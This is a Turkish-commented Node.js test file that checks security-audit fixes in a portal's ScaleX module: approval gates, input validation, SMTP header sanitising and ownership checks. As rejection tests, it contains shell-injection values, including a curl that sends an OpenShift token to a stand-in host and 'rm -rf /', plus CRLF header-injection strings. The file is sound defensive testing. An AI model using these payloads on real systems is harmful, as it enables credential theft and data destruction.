// server/scalex/__tests__/scalex-security-fixes.test.cjs
//
// 2026-08-30 dusmanca guvenlik denetiminin bulgulari. HEPSININ ORTAK SINIFI:
// "var oldugu IDDIA EDILEN ama hic calismayan kontrol". Tehlikeli olan kapinin acik
// olmasi degil — ekranin kullaniciya kapinin KAPALI oldugunu soylemesiydi.
//
// Bu suit davranisi olcer: her test, duzeltme geri alindiginda KIRMIZI olmali. Kaynak
// metnine bakan birkac test var (baglantinin varligini baska turlu kanitlayamadigim
// yerlerde) ve onlar da yorumlari ELEYEREK bakiyor.
'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const db = require('../../db/index.cjs');
const launch = require('../launch.cjs');
const gates = require('../../ansible/change-gates.cjs');
const restrictions = require('../../logx/v2/restrictions.cjs');

const codeOnly = (s) =>
  s
    .split('\n')
    .filter((l) => !/^\s*(\/\/|\*|\/\*)/.test(l))
    .join('\n');
const read = (p) => fs.readFileSync(path.join(__dirname, '..', '..', '..', p), 'utf8');

// ── BICIM DUYARSIZ OKUMA ────────────────────────────────────────────────────
// Bu bekciler KURAL kilitler ("banner duyuruluyor mu", "izler temizleniyor mu"),
// satir duzenini ve tirnak bicimini degil. Depoya prettier girince cagrilar cok
// satira yayildi ve tirnaklar tekile dondu; kural aynen dururken bekciler KIRMIZI
// oldu. `norm()` yalnizca bosluk ve tirnak esitler.
const norm = (s) => s.replace(/\s+/g, ' ').replace(/'/g, '"');
const INDEX = codeOnly(read('server/scalex/index.cjs'));

// ── S1. OCO KAPISI: prod tespiti gateVars'tan da okunmali ───────────────────
// BULGU: `isProductionRequest` yalnizca `env`/`ortam` anahtarlarina bakiyor; ScaleX
// ortami `target_environment` adiyla gonderiyor. Tek kaynak okundugu icin ScaleX'in
// PROD islemleri OCO kapisini sessizce atliyordu.

test('S1: ScaleX sekilli extraVars (target_environment) + gateVars.env=prod → OCO kapisi ATESLENIR', () => {
  const overrides = { ocoCheck: { enabled: true } };
  const extraVars = { target_environment: 'prod', target_namespace: 'odeme' }; // env/ortam YOK
  const gateVars = { env: 'prod', tenant: 'ark' };
  assert.equal(gates.isOcoGateApplicable(overrides, extraVars, gateVars), true);
});

test('S1: duzeltme oncesi davranis KIRMIZI olurdu — gateVars verilmezse ScaleX yine atlar', () => {
  // Bu test bekcinin KOR OLMADIGINI kanitlar: eski imza (gateVars'siz) ile ayni girdi
  // false doner. Yani duzeltme geri alinirsa yukaridaki test kirmizi olur.
  const overrides = { ocoCheck: { enabled: true } };
  const extraVars = { target_environment: 'prod' };
  assert.equal(gates.isOcoGateApplicable(overrides, extraVars, undefined), false);
});

test("S1: Self Service GERILEMESI YOK — env extraVars'ta ise kapi eskisi gibi ateslenir", () => {
  const overrides = { ocoCheck: { enabled: true } };
  assert.equal(gates.isOcoGateApplicable(overrides, { env: 'prod' }, undefined), true);
  assert.equal(gates.isOcoGateApplicable(overrides, { ortam: 'PRODUCTION' }, {}), true);
});

test('S1: prod DEGILSE kapi ateslenmez (genisletme daraltmaya donusmedi)', () => {
  const overrides = { ocoCheck: { enabled: true } };
  assert.equal(
    gates.isOcoGateApplicable(overrides, { target_environment: 'test' }, { env: 'test' }),
    false,
  );
});

test('S1: ocoCheck kapaliysa hicbir kaynak kapiyi acamaz', () => {
  assert.equal(
    gates.isOcoGateApplicable({ ocoCheck: { enabled: false } }, { env: 'prod' }, { env: 'prod' }),
    false,
  );
});

// ── S2. SMART KAPISI ────────────────────────────────────────────────────────

test('S2a: SMART "gerekli" iken ayar YOKSA is baslatilmaz (fail-closed)', () => {
  // `smart-gate.isSmartRequired` bos ayarda false doner — Self Service icin dogru, ama
  // ScaleX'te "onaysiz gecti" demek. Route bunu ayrica kontrol etmek ZORUNDA.
  assert.match(INDEX, /policy\.smart === 'require' && !svcConfig\.smartApproval\?\.enabled/);
  assert.match(INDEX, /smart_not_configured/);
});

test("S2a: bos ayarin smart-gate'te GERCEKTEN onay gerektirmedigi (fail-closed sartinin sebebi)", () => {
  const smartGate = require('../../ansible/smart-gate.cjs');
  assert.equal(
    smartGate.isSmartRequired({}, {}),
    false,
    'bos ayar onay GEREKTIRMIYOR — route kontrolu bu yuzden sart',
  );
  assert.equal(smartGate.isSmartRequired(undefined, {}), false);
});

test('S2b: SMART bileti GERCEK sunucu/template kimligiyle acilir (0 degil)', () => {
  // `server: {id: 0}` yazilsaydi onay geldiginde `getServerById(0)` bulunamaz ve
  // ONAYLANMIS bir prod islemi sessizce hic calismazdi.
  assert.match(INDEX, /server: \{ id: runServerId \}, templateId: runTemplateId/);
  assert.doesNotMatch(INDEX, /server: \{ id: 0 \}/, 'sifir kimlik kalmamali');
  assert.doesNotMatch(INDEX, /templateId: 0\b/, 'sifir template kimligi kalmamali');
});

// ── S5. /discover girdi dogrulamasi ─────────────────────────────────────────

test("S5: /discover de format dogrulamasindan gecer (namespace playbook'a ham gidiyordu)", () => {
  const discover = INDEX.slice(INDEX.indexOf("router.post('/discover'"));
  const body = discover.slice(0, discover.indexOf('launchOnAwx'));
  assert.match(body, /assertValidDiscoveryTargets/);
});

test('S5: kabuk metakarakterli namespace REDDEDILIR', () => {
  assert.throws(
    () => launch.assertValidDiscoveryTargets({ namespace: '; curl evil/$(oc whoami -t) #' }),
    /Geçersiz namespace/,
  );
  assert.throws(
    () => launch.assertValidDiscoveryTargets({ namespace: 'a b' }),
    /Geçersiz namespace/,
  );
  assert.throws(
    () => launch.assertValidDiscoveryTargets({ namespace: 'x'.repeat(64) }),
    /Geçersiz namespace/,
  );
});

test('S5: kabuk metakarakterli uygulama adi REDDEDILIR', () => {
  assert.throws(
    () => launch.assertValidDiscoveryTargets({ namespace: 'ok', apps: ['a; rm -rf /'] }),
    /Geçersiz uygulama/,
  );
  assert.throws(
    () => launch.assertValidDiscoveryTargets({ namespace: 'ok', apps: ['api', '`id`'] }),
    /Geçersiz uygulama/,
  );
});

test('S5: gecerli girdi gecer ve apps kesifte OPSIYONEL kalir', () => {
  assert.doesNotThrow(() => launch.assertValidDiscoveryTargets({ namespace: 'odeme-prod' }));
  assert.doesNotThrow(() =>
    launch.assertValidDiscoveryTargets({ namespace: 'odeme-prod', apps: ['payment-api'] }),
  );
});

// ── S11. mailCc — SMTP baslik enjeksiyonu ───────────────────────────────────

test("S11: CC'de CRLF (Bcc enjeksiyonu) REDDEDILIR", () => {
  assert.throws(
    () => launch.sanitizeMailCc('ekip@x.com\r\nBcc: disari@saldirgan.com'),
    /satır sonu/i,
  );
  assert.throws(() => launch.sanitizeMailCc('a@x.com\nSubject: sahte'), /satır sonu/i);
  assert.throws(() => launch.sanitizeMailCc('a@x.com\tb'), /satır sonu/i);
});

test('S11: adres formati zorunlu, adres sayisi sinirli', () => {
  assert.throws(() => launch.sanitizeMailCc('duz-metin'), /Geçersiz CC/);
  assert.throws(() => launch.sanitizeMailCc('a@x.com, bozuk@'), /Geçersiz CC/);
  assert.throws(
    () => launch.sanitizeMailCc(Array.from({ length: 11 }, (_, i) => `a${i}@x.com`).join(',')),
    /en fazla 10/i,
  );
});

test('S11: gecerli CC normalize edilir, bos deger bos kalir', () => {
  assert.equal(launch.sanitizeMailCc(' a@x.com , b@y.com.tr '), 'a@x.com,b@y.com.tr');
  assert.equal(launch.sanitizeMailCc(''), '');
  assert.equal(launch.sanitizeMailCc(undefined), '');
});

test('S11: route ham mailCc DEGIL, temizlenmis degeri kullanir', () => {
  assert.match(INDEX, /const mailCc = launch\.sanitizeMailCc\(req\.body\?\.mailCc\)/);
  assert.doesNotMatch(INDEX, /const mailCc = String\(req\.body/, 'ham .trim() yolu kalmamali');
});

// ── S6. /adopt — uydurma kayit ──────────────────────────────────────────────

test("S6: /adopt kaydin SAHIBINI oturumdan alir, client'tan DEGIL", () => {
  const adopt = INDEX.slice(INDEX.indexOf("router.post('/adopt'"));
  const body = adopt.slice(0, adopt.indexOf('res.json'));
  assert.match(body, /stoppedBy: user\.username/);
  assert.doesNotMatch(
    body,
    /req\.body\?\.stoppedBy/,
    'client denetim izine baskasinin adini yazamamali',
  );
});

test('S6: /adopt uygulama adini dogrular ve uygulama bazli yetkiyi UYGULAR', () => {
  const adopt = INDEX.slice(INDEX.indexOf("router.post('/adopt'"));
  const body = adopt.slice(0, adopt.indexOf('res.json'));
  assert.match(body, /assertValidDiscoveryTargets/);
  assert.match(body, /assertAppsAllowed/);
});

test('S6: /adopt previousReplicas sinirli tam sayi olmali', () => {
  const adopt = INDEX.slice(INDEX.indexOf("router.post('/adopt'"));
  assert.match(adopt, /Number\.isInteger\(prev\)/);
  assert.match(adopt, /prev > 1000/);
});

// ── S4(guv). ocp_app kaynak tipi ────────────────────────────────────────────

test('S4: ocp_app kisitlamasi OLUSTURULABILIR (okuma yolu taniyordu, yazma yolu reddediyordu)', () => {
  assert.ok(restrictions.RESOURCE_TYPES.includes('ocp_app'));
  assert.ok(restrictions.RESOURCE_TYPES.includes('ocp_namespace'), 'mevcut tipler duruyor');
  assert.ok(restrictions.RESOURCE_TYPES.includes('legacy_app'), 'mevcut tipler duruyor');
});

// ── INFRA. Paylasilan yetki tablosunun patlama yaricapi ─────────────────────

test('INFRA: grup grant tablosu YOKSA yetki sorgusu patlamaz (LogX/OpsX/Telnet ayakta kalir)', async () => {
  const orig = db.query;
  let sawGroupTable = 0;
  db.query = async (sql) => {
    if (/group_grants/.test(sql)) {
      sawGroupTable++;
      const e = new Error("Invalid object name 'logx_v2_restriction_group_grants'.");
      e.number = 208;
      throw e;
    }
    return { rows: [{ id: 1, username: 'ali', group_dn: null }] };
  };
  const warn = console.warn;
  console.warn = () => {};
  try {
    const user = { username: 'ali', role: 'User', groups: ['cn=x'] };
    // Patlamamali ve kullanici adi grant'i CALISMAYA DEVAM etmeli.
    assert.equal(await restrictions.isAllowed('ocp_namespace', 'k', user), true);
    assert.ok(sawGroupTable >= 1, 'once grup tablosuyla denenmis olmali');
    // Gerileme YONU fail-CLOSED: yalnizca grupla yetkili biri erisimi KAYBEDER.
    const veli = { username: 'veli', role: 'User', groups: ['cn=x'] };
    assert.equal(await restrictions.isAllowed('ocp_namespace', 'k', veli), false);
  } finally {
    db.query = orig;
    console.warn = warn;
  }
});

// ── S3. Oturum AD gruplarini tasimali ───────────────────────────────────────

test("S3: oturum nesnesi `groups` tasir (yoksa grup grant'i BASTAN SONA olu kalir)", () => {
  const AUTH = codeOnly(read('server/auth/index.cjs'));
  assert.match(AUTH, /req\.session\.user = \{[\s\S]*?groups:/);
});

test('S3: ldap gruplari normalize edip ustsinirla dondurmeye devam ediyor', () => {
  const LDAP = codeOnly(read('server/auth/ldap.cjs'));
  assert.match(LDAP, /MAX_GROUPS/);
  assert.match(LDAP, /groups,/);
});

// ── OCO KAPALI DONGUSU ──────────────────────────────────────────────────────
// Kapi canlandirilinca (S1) "pencere henuz acilmadi" dali ERISILEBILIR hale geldi.
// Ortak kapi orada `ocoAction` bekliyor; ScaleX ekraninda o alan YOK ve ScaleX
// zamanlama da yapamiyor → kullanici ayni mesaji alip duracakti.

test('OCO: ScaleX tek gecerli cevabi ("later") sunucuda verir — ekrana olmayan bir secim sorulmaz', () => {
  assert.match(INDEX, /ocoAction: 'later'/);
  assert.doesNotMatch(
    INDEX,
    /ocoAction: req\.body\?\.ocoAction/,
    "client'tan ocoAction beklenmemeli",
  );
});

test('OCO: ScaleX zamanlama YAPAMAZ — "later" disindaki cevap zaten hata verirdi', () => {
  assert.match(INDEX, /createOcoAwxSchedule: async \(\) => \{[\s\S]{0,200}?throw/);
});

test('OCO: "later" ortak kapida is BASLATMADAN respond doner (dayanak)', () => {
  const GATES = codeOnly(read('server/ansible/change-gates.cjs'));
  assert.match(GATES, /ocoAction === 'later'[\s\S]{0,120}?ocoDeferred: true/);
});

// ── SORGU SINIRLARI ─────────────────────────────────────────────────────────

test("LIMIT: MIRROR_LIMIT ile SQL'deki TOP birbirini tutar", () => {
  // SQL'e sablon degiskeni koymak bu modulde yasak, bu yuzden `TOP 501` elle yazili.
  // Ikisi ayrisirsa kirpma sessizce yanlis yerde olurdu.
  const state = require('../state.cjs');
  const STATE = read('server/scalex/state.cjs');
  const m = STATE.match(/SELECT TOP (\d+) \* FROM scalex_state_mirror/);
  assert.ok(m, 'listMirror sorgusu bulunamadi');
  assert.equal(Number(m[1]), state.MIRROR_LIMIT + 1, 'bir fazla cekilmeli ("daha var mi" icin)');
});

test('LIMIT: /stopped kirpilmayi ve gizlenen kayit sayisini SOYLER', () => {
  assert.match(INDEX, /truncated: all\.truncated === true/);
  assert.match(INDEX, /hiddenCount: all\.length - rows\.length/);
});

test('LIMIT: /history NVARCHAR(MAX) alanlarini cekmez', () => {
  const hist = INDEX.slice(INDEX.indexOf("router.get('/history'"));
  const body = hist.slice(0, hist.indexOf('res.json'));
  assert.doesNotMatch(body, /SELECT TOP 200 \*/, 'SELECT * result_json/error_message getirirdi');
  assert.doesNotMatch(body, /result_json/);
  assert.doesNotMatch(body, /error_message/);
  assert.match(body, /SELECT TOP 200 id, request_key/);
});

// ── GORUNURLUK ──────────────────────────────────────────────────────────────

test('GORUNURLUK: seed ELEMENT BAZINDA idempotent (yeni sayfa mevcut kurulumda gorunmez kalmasin)', () => {
  const SETUP = codeOnly(read('server/db/mssql-setup.cjs'));
  // YALNIZCA gorunurluk seed'i incelenir: dosyadaki diger "tablo bossa doldur" seed'leri
  // (splunk_products, selfservice_groups) tek seferlik LISTE seed'i ve sonrasi admin
  // yonetiminde — ayni hata sinifinda degiller.
  const i = SETUP.indexOf('portal_element_visibility (element_key, principal_type');
  assert.ok(i > 0, 'gorunurluk seed blogu bulunamadi');
  const block = SETUP.slice(Math.max(0, i - 2000), i + 400);
  assert.match(block, /SELECT DISTINCT element_key FROM portal_element_visibility/);
  assert.match(block, /hasRules\.has\(el\.element_key\)/);
  // Eski "tablo TAMAMEN bossa bas" davranisi bu blokta kalmamali.
  assert.doesNotMatch(block, /if \(any\.recordset\.length\) return;/);
});

test('GORUNURLUK: ScaleX varsayilan gorunurlukte ve OpsX/LogX ile AYNI rollerde', () => {
  const { DEFAULT_VISIBILITY } = require('../../auth/visibility.cjs');
  assert.deepEqual(DEFAULT_VISIBILITY.ScaleX, ['Admin', 'User']);
  assert.deepEqual(DEFAULT_VISIBILITY.ScaleX, DEFAULT_VISIBILITY.OpsX, 'OpsX ile ayni varsayilan');
});

test('GORUNURLUK: elle calistirilabilir deploy betigi var ve idempotent', () => {
  const sql = read('deploy/sql/2026-08-30-scalex-gorunurluk.sql');
  assert.match(sql, /IF NOT EXISTS/);
  assert.match(sql, /portal_element_visibility/);
  assert.ok((sql.match(/IF NOT EXISTS/g) || []).length >= 3, 'her INSERT korumali olmali');
});

// ── YAPILANDIRMA ────────────────────────────────────────────────────────────

test("ENV: kodun okudugu her SCALEX_* degiskeni .env.example'da belgeli", () => {
  const envExample = read('.env.example');
  // TUM `server/scalex/*` taranir, elle sayilan iki dosya DEGIL: liste elle tutuldugu
  // surece yeni bir dosyanin (orn. reconciler.cjs) degiskenleri sessizce belgesiz
  // kalir — nitekim tam olarak bu oldu.
  const fsx = require('node:fs');
  const dir = path.join(__dirname, '..');
  const files = fsx
    .readdirSync(dir)
    .filter((f) => f.endsWith('.cjs'))
    .map((f) => `server/scalex/${f}`);
  // `process.env.X` VE `env_var_name: 'X'` (registry seed'i) — yani GERCEKTEN
  // okunan degiskenler. Ham `SCALEX_[A-Z_]+` taramasi yorumlardaki dosya adlarini
  // da (or. scalex_file/SCALEX_AWX_SETUP.md) degisken sanip yanlis kirmizi veriyordu.
  const used = new Set();
  for (const f of [...files, 'server/db/mssql-setup.cjs']) {
    const src = read(f);
    for (const m of src.matchAll(/process\.env\.(SCALEX_[A-Z_]+)\b/g)) used.add(m[1]);
    for (const m of src.matchAll(/process\.env\[['"`](SCALEX_[A-Z_]+)['"`]\]/g)) used.add(m[1]);
    for (const m of src.matchAll(/env_var_name:\s*['"`](SCALEX_[A-Z_]+)['"`]/g)) used.add(m[1]);
  }
  assert.ok(used.size >= 3, 'en az uc degisken bulunmali');
  const missing = [...used].filter((v) => !envExample.includes(v));
  assert.deepEqual(missing, [], `.env.example eksik: ${missing.join(', ')}`);
});

// ── EKRAN DUZELTMELERI ──────────────────────────────────────────────────────

test("UI: onizleme satir anahtari CLUSTER icerir (ayni uygulama cok cluster'da olabilir)", () => {
  const PREVIEW = codeOnly(read('src/components/scalex/steps/PreviewStep.tsx'));
  assert.match(PREVIEW, /key=\{`\$\{w\.cluster\}\/\$\{w\.name\}`\}/);
  assert.doesNotMatch(PREVIEW, /key=\{w\.name\}/, 'cakisan anahtar kalmamali');
});

test('UI: geri almada bilinmeyen hedef "?" ile gecistirilmez', () => {
  const PREVIEW = codeOnly(read('src/components/scalex/steps/PreviewStep.tsx'));
  assert.match(PREVIEW, /unknownTarget/);
  assert.doesNotMatch(PREVIEW, /to \?\? "\?"/, 'anlamsiz "?" kalmamali');
});

test('UI: sinir asimi ONIZLEMEDE soylenir ve Calistir pasiflesir', () => {
  const PREVIEW = codeOnly(read('src/components/scalex/steps/PreviewStep.tsx'));
  assert.match(PREVIEW, /r\.exceedsMaxTargets/);
  assert.match(PREVIEW, /disabled=\{busy \|\| blocked/);
});

test('UI: buton neden pasif oldugunu SOYLER, OCO numarasi bosken calistirilamaz', () => {
  const PREVIEW = codeOnly(read('src/components/scalex/steps/PreviewStep.tsx'));
  assert.match(PREVIEW, /blockReason/);
  assert.match(PREVIEW, /const ocoOk = g\.oco !== "require"/);
});

test('UI: iptal hata verirse buton KILITLI KALMAZ', () => {
  const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
  const cancelFn = PAGE.slice(
    PAGE.indexOf('function cancel()'),
    PAGE.indexOf('function cancel()') + 500,
  );
  assert.match(cancelFn, /setCancelling\(false\)/);
});

test('UI: AWX is numarasi donmezse sonsuz spinner yerine mesaj gosterilir', () => {
  const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
  assert.match(PAGE, /r\.ocoScheduled \|\| r\.jobId == null \|\| r\.serverId == null/);
});

test("UI: hata banner'i ekran okuyucuya DUYURULUR", () => {
  const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
  assert.match(norm(PAGE), /role="alert" aria-live="assertive"/);
});

test('UI: GitOps uyarisi (turuncu rozet) koyu temada okunabilir', () => {
  const CSS = read('src/index.css');
  assert.match(CSS, /:root\[data-theme="dark"\] \.pf-label--orange \{ color: #[0-9a-f]{6}; \}/i);
});

test('UI: "durdurulmus kaydi yok" derken gizlenen kayitlari SOYLER', () => {
  const PANEL = codeOnly(read('src/components/scalex/StoppedPanel.tsx'));
  assert.match(PANEL, /hiddenCount/);
  assert.match(PANEL, /yetki kısıtı nedeniyle görünmüyor/);
});

// ── /cancel KAPSAMI ─────────────────────────────────────────────────────────

test('S14: /cancel yalnizca ScaleX islerine dokunur', () => {
  // Sahiplik kontrolu `ansible_job_history` uzerinden yapiliyor ve MODUL AYRIMI YOK —
  // bu uc, kullanicinin LogX/OpsX/Telnet uzerinden baslattigi kendi islerini de iptal
  // edebilirdi ve `UPDATE scalex_operations` her durumda kosuyordu.
  const cancel = INDEX.slice(INDEX.indexOf("router.post('/cancel"));
  const body = cancel.slice(0, cancel.indexOf('res.json'));
  assert.match(body, /FROM scalex_operations WHERE awx_server_id = \$1 AND awx_job_id = \$2/);
  assert.match(body, /if \(!own\.length\)/);
  // Kapsam kontrolu IPTALDEN ONCE olmali: once iptal edip sonra "bu bizim isimiz
  // degilmis" demek, isi zaten durdurmus olurdu.
  assert.ok(
    body.indexOf('if (!own.length)') < body.indexOf('cancelJobOnServer'),
    'kapsam kontrolu cancelJobOnServer cagrisindan ONCE gelmeli',
  );
});

// ── ERISILEBILIRLIK VE EKRAN CIKMAZLARI (2. tur UX bulgulari) ───────────────

test('UI: secili durum ekran okuyucuya iletiliyor (renk tek basina yetmiyordu)', () => {
  const OP = codeOnly(read('src/components/scalex/steps/OperationStep.tsx'));
  const SCOPE = codeOnly(read('src/components/scalex/steps/ScopeStep.tsx'));
  // Bu ekranda EN TEHLIKELI bilgi hangi modun secili oldugudur.
  assert.match(OP, /aria-pressed=\{mode === "dry_run"\}/);
  assert.match(OP, /aria-pressed=\{mode === "apply"\}/);
  assert.match(OP, /aria-pressed=\{active\}/, 'islem kartlari da');
  assert.match(SCOPE, /aria-pressed=\{env === e\}/);
  assert.match(SCOPE, /aria-pressed=\{tenant === t\}/);
});

test('UI: mod kartlarinin devre disi gorunumu islem kartlariyla AYNI', () => {
  // Ayni ekranda iki farkli "devre disi" gorunumu vardi: islem kartlari
  // `opacity-50 cursor-not-allowed` aliyor, mod kartlari yalnizca `disabled` idi.
  const OP = codeOnly(read('src/components/scalex/steps/OperationStep.tsx'));
  const modeCards = [...OP.matchAll(/setMode\("(?:dry_run|apply)"\)\}[\s\S]{0,400}?`\}/g)].map(
    (m) => m[0],
  );
  assert.equal(modeCards.length, 2, 'iki mod karti bulunamadi');
  for (const c of modeCards) assert.match(c, /opacity-50 cursor-not-allowed/);
});

test('UI: uygulama adlari listelerde TEKILLESTIRILIYOR', () => {
  // `picked` (cluster × uygulama) satirlarindan geliyor; tekillestirilmezse ayni
  // uygulama uc cluster'da "api, api, api" olarak gorunuyordu.
  const OP = codeOnly(read('src/components/scalex/steps/OperationStep.tsx'));
  assert.match(
    OP,
    /const uniq = \(ws: typeof picked\) => \[\.\.\.new Set\(ws\.map\(\(w\) => w\.name\)\)\]/,
  );
  for (const list of ['notRestorable', 'alreadyStopped', 'withHpa']) {
    assert.match(OP, new RegExp(`const ${list} = uniq\\(`), `${list} tekillestirilmeli`);
  }
});

test('UI: kismen geri alinabilir uygulama ve engelleyen cluster SOYLENIYOR', () => {
  // Kesif listesinde "geri alınabilir" rozeti gorunurken sonraki adimda "geri
  // alınamaz" yazmasi, kullaniciyi iki ekran arasinda birakiyordu.
  const OP = codeOnly(read('src/components/scalex/steps/OperationStep.tsx'));
  assert.match(OP, /partiallyRestorable/);
  assert.match(OP, /blockingClusters/);
  assert.match(OP, /seçimden çıkarın/, 'ne yapilacagi da yazmali');
});

test('UI: kesif asilirsa gecen sure, AWX is numarasi ve CIKIS yolu var', () => {
  const W = codeOnly(read('src/components/scalex/steps/WorkloadStep.tsx'));
  assert.match(W, /setElapsed/, 'gecen sure gosterilmeli');
  assert.match(W, /AWX işi/, 'is numarasi gosterilmeli');
  assert.match(W, /onBack\(\)/, 'vazgecme yolu olmali');
  assert.match(W, /elapsed >= 90/, 'uzun surerse aciklama');
});

// ── GRUP GRANT'I: ozellik artik UCTAN UCA calisir ───────────────────────────

test("INFRA: grup grant'i olusturma/silme ucu VAR (yoksa ozellik kullanilamazdi)", () => {
  // `addGroupGrant`/`removeGroupGrant` yazilmis ve test edilmisti ama HICBIR route
  // cagirmiyordu: yetki bir AD grubuna verilebiliyor "gibi" gorunuyor, verilmesinin
  // yolu yoktu. Oturum `groups` tasimasi (S3) ve `ocp_app` tipi (S4) ile birlikte
  // zincirin ucuncu kopuk halkasi buydu.
  const LOGX = codeOnly(read('server/logx/v2/index.cjs'));
  assert.match(LOGX, /router\.post\('\/admin\/restrictions\/:id\/group-grants'/);
  assert.match(LOGX, /router\.delete\('\/admin\/restrictions\/:id\/group-grants'/);
  assert.match(LOGX, /restrictions\.addGroupGrant\(/);
  assert.match(LOGX, /restrictions\.removeGroupGrant\(/);
});

test("INFRA: grup DN'i URL'e DEGIL govdeye konur", () => {
  // DN virgul/esittir/bosluk icerir; URL'e koymak hem kacis sorunu cikarir hem de
  // grup adlarini erisim loglarina yazardi.
  const LOGX = codeOnly(read('server/logx/v2/index.cjs'));
  assert.match(LOGX, /group-grants'[\s\S]{0,200}?req\.body\?\.groupDn/);
  assert.ok(!/group-grants\/:groupDn/.test(LOGX), 'DN yol parametresi olmamali');
});

// ── CIKMAZDAN CIKIS ─────────────────────────────────────────────────────────

test('UI: dogrulama hatasindan ISLEM adimina donulebilir', () => {
  // `done`dan geri donus yoktu; tek cikis tum sihirbazi (KESIF DAHIL) bastan
  // yapmakti. Portal girdiyi zaten dogruladigi icin buraya dusen hatalar playbook
  // kaynaklidir — kullanici ayni girdiyi tekrar girip ayni hatayi alirdi.
  const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
  assert.match(norm(PAGE), /runResult\?\.stage === "validation"/);
  assert.match(PAGE, /İşlem adımına dön/);
});

test('UI: bos dogrulama hatasi bos paragraf birakmiyor', () => {
  const PANEL = codeOnly(read('src/components/scalex/steps/ScaleXResultPanel.tsx'));
  assert.match(PANEL, /result\.validationError \|\|/, 'null durumunda bir sey yazmali');
});

test('UI: `apply` modu da ACIKCA etiketleniyor (yalnizca dry_run rozet tasiyordu)', () => {
  const PREVIEW = codeOnly(read('src/components/scalex/steps/PreviewStep.tsx'));
  assert.match(PREVIEW, /Uygulanacak — değişiklik yapılır/);
});

test("UI: panelden geri alma onceki islemin BANNER'ini temizler", () => {
  const PAGE = codeOnly(read('src/components/scalex/ScaleXPage.tsx'));
  const fn = PAGE.slice(PAGE.indexOf('function restoreFromPanel'));
  const body = fn.slice(0, fn.indexOf('setStep("preview")'));
  // Banner temizligi `resetRunState()`e tasindi — orada onceki calistirmanin TUM
  // izleri (sonuc paneli, saglik satirlari, is takibi) birlikte temizleniyor.
  // Yalnizca banner'i temizlemek yetmiyordu: eski `runResult` ve `health` ekranda
  // kaliyordu (bkz. U13b).
  assert.match(body, /resetRunState\(\)/, 'onceki islemin izleri temizlenmiyor');
  const reset = PAGE.slice(
    PAGE.indexOf('function resetRunState()'),
    PAGE.indexOf('function restart()'),
  );
  assert.match(norm(reset), /setError\(null\); setNotice\(null\)/, 'banner temizligi kaybolmus');
  assert.match(body, /setOperationTouched\(true\)/, 'geri tusu bos form gostermemeli');
});
